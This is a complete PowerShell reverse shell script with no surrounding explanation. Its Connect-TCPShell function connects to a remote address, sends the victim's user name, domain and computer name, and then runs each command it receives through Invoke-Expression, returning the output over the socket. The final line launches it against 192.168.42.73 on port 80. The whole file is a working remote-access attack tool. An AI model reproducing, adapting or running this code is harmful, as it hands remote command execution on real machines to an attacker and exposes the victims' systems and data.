Function Connect-TCPShell {
	[CmdletBinding()]
	Param(
		[Parameter(Mandatory=$true)]
		[ipaddress]$IPAddress,

		[Parameter()]
		[ValidateRange(1, 65535)]
		[uint32]$Port = 4444
	)
    
    try {
        
	    $client = New-Object System.Net.Sockets.TcpClient($IPAddress, $Port)

	    $receive = New-Object byte[] 65535

	    $send = [System.Text.Encoding]::ASCII.GetBytes("$env:USERNAME@$env:USERDOMAIN/$env:COMPUTERNAME")

	    $stream = $client.GetStream()
	    $stream.Write($send, 0, $send.Length)

	    while( ($n=$stream.read($receive, 0, $receive.Length) ) -ne 0 ){
		    $command = [System.Text.Encoding]::ASCII.GetString($receive, 0, $n)
		    try {
			    $results = (Invoke-Expression -Command $command *>&1 | Out-String)
		    } catch {
			    $results += $Error[0]
			    $Error.Clear()
		    }
		
		    $results += "`n"

		    $send = [System.Text.Encoding]::ASCII.GetBytes($results)
		    $stream.Write($send, 0, $send.Length)
		    $stream.Flush()
	    }
	    $client.Close()
    } catch {}
}

Connect-TCPShell -IPAddress 192.168.42.73 -Port 80